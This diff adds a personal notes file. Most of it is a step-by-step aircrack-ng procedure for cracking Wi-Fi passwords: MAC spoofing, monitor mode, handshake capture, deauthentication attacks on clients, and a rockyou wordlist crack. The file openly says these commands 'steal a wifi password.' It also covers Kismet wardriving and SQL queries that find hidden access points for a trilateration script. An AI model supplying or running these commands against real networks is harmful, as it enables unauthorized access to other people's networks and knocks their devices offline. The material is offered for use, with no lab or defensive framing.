@@ -1,0 +1,27 @@
+====USING AIRCRACK:====
+ifconfig (look for your vlan card. It should be called wlan something or other. Probably 0)
+ifconfig wlan0 down (kills the adaptor for a minute. Macchanger doesn’t work if on.)
+macchanger -r wlan#
+airmon-ng
+airmon-ng start wlan[#] (check for # in ifconfig. Make sure your hardware is actually attached to your vm)
+airodump-ng wlan#mon
+airodump-ng -c (specified channel from target) –bssid (Your new friend) -w (the file you want it in)
+aireplay-ng -0 (# of mean frames to send (START LOW)) -a (Your new friend mac address) -c (Your friend by extension’s mac address. One of the clients, bottom half of the airdump feed. You’ll see it.) wlan#mon
+aircrack-ng /home/kali/(yourtxtfilefromearlier.txt.cap) -w rockyou.txt (Run wordlists on kali and unpack rockyou.txt. That will be found in /usr/share/wordlists/rockyou.txt once unpacked. Use full file paths for the .cap, and the rockyou.txt file.)
+these commands will allow you to steal a wifi password. I highly recommend reading a more fleshed out  guide to aircrack. 
+
+====KISMET W/ KESTREL====
+kismet -t (The name you want)
+Kismet is fully displayed through a GUI. It's very easy to use. 
+-c lets you choose your NIC (wlan0mon, etc.) I use airmon-ng start wlan0 to put my devices into promiscuous mode. You can use airmon-ng stop wlan0mon to switch back. In kismet though, there's a dropdown menu that allows using
+multiple NICs. If you use dualband cards, or multiple alfacards, kismet will automatically jump between all of them to cast the largest possible net. To use your GUI connect to the link at the top of the terminal. 
+
+====KISMET TRILATERATION SCRIPT====
+Run the script with python3, it accepts an SSID as an argument, and will map the points of contact via trilateration. The AP is depicted as a big red circle which denotes how far away you reached it from in the area. It creates more
+of a heat map than a precise location. A Kismet file is a csv file, but there's some difficulty actually parsing. Use sqLite3 to parse the kismet file. Below are some queries to pull specific pieces of data from it.
+
+To find all hidden APs:
+ SELECT devmac FROM devices WHERE hex(device) LIKE '%22646F7431312E61647665727469736564737369642E636C6F616B6564223A2031%' ;
+
+To list all APs:
+ SELECT devmac FROM devices ; 
